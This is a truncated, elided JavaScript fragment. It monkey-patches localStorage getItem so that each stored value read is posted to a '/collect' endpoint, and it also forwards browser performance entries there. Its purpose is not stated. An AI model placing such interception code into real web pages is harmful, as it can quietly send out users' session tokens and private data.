...
const originalGetValue = localStorage.__proto__.getItem;
...
const observer = new PerformanceObserver(list => {
  originalFetch('/collect', {
    ...
    body: JSON.stringify({
      type: "performance",
      payload: list.getEntries()
    })
  });
});
let eventListenerPrototypes = [HTMLElement.prototype, document, window];
...
Object.defineProperty(localStorage.__proto__, 'getItem', {
  value: function () {
    let result = originalGetValue.apply(this, arguments);
    originalFetch('/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
